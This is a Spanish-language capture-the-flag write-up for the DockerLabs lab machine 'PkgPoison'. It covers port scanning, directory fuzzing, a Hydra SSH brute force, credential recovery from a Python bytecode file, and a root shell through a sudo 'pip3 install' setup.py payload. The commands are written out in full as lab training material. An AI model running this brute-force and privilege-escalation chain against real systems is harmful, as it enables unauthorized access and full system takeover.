# 🖥️ Writeup - PkgPoison 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip pkgpoison.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh pkgpoison.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 16:45 CET
Nmap scan report for 172.17.0.2
Host is up (0.000033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:87:50:66:15:23:d6:c3:90:3f:ea:8c:a4:4b:b3:ff (RSA)
|   256 d1:35:c1:82:09:e8:c2:c7:cd:98:89:61:c2:6b:14:64 (ECDSA)
|_  256 dd:01:45:ce:bd:a3:05:21:5b:31:4c:2f:df:38:c4:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 404 Not Found
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```

Identificamos los puertos abiertos `22` (SSH) y `80` (HTTP).

Accedemos a la máquina objetivo a través del puerto `80` (HTTP), pero la página no contiene ninguna información relevante.

# GOBUSTER

Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,bak,sh,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 589]
/notes                (Status: 301) [Size: 308] [--> http://172.17.0.2/notes/]
Progress: 1543899 / 1543899 (100.00%)
===============================================================
Finished
===============================================================
```

Descubrimos un directorio oculto llamado `/notes`. Navegamos a dicho directorio y encontramos un archivo, `notes.txt`, con el siguiente mensaje:

```
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
``` 

Este mensaje nos proporciona grandes pistas. En primer lugar, sabemos que en el sistema existen un usuario llamado `dev` y otro llamado `admin`. Por otro lado, parece que obtenemos las credenciales iniciales para el usuario `dev`.

Probamos de acceder por el puerto `22` (SSH) con las credenciales obtenidas inicialmente.

```bash
ssh dev@172.17.0.2
```

Las credenciales no han funcionado, lo que confirma que el usuario `dev` ya cambió su contraseña insegura.

# HYDRA

Aun así, consideramos que la nueva contraseña del usuario `dev` también podría ser débil, por lo que probamos un ataque de `fuerza bruta` dirigido contra el puerto `22`.

```bash
hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 50
```

Info:
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-23 16:48:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: dev   password: computer
1 of 1 target successfully completed, 1 valid password found
```

Encontramos las credenciales correctas para el usuario `dev` : `computer`.
Accedemos a la máquina por `SSH`.

```bash
ssh dev@172.17.0.2
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`, pero no encontramos ninguna vía de escalada.

Tras enumerar varios directorios en el sistema, localizamos la ruta `/opt/scripts/__pycache__/`. Dentro de este directorio, encontramos un archivo de `bytecode` compilado de Python llamado `secret.cpython-38.pyc`.

Para inspeccionar si el archivo contiene información sensible o texto legible, utilizamos el comando `strings` para extraer las cadenas de texto:

```bash
strings secret.cpython-38.pyc
```

Info:
```
adminz
p@$$w0r8321z
Authenticating...)
print)
usernameZ
password
	secret.py
auth
<module>
```

Observamos que las primeras líneas parecen contener credenciales para el usuario `admin`, aunque identificamos un carácter 'z' redundante al final de la contraseña.

Probamos la autenticación para el usuario `admin` con estas credenciales (sin el carácter 'z' final).

```bash
su admin
```

Hemos pivotado con éxito al usuario `admin`.

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for admin on 200a64db404a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on 200a64db404a:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

Descubrimos que podemos ejecutar el binario `pip3` con privilegios de `root` para instalar cualquier cosa. 

Aprovechamos este vector de la configuración de sudo para la escalada de privilegios a `root` de la siguiente manera:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```

Info:
```
Processing /tmp/tmp.HkkQWWnrQo
# whoami
root
# 
```

Ya somos root!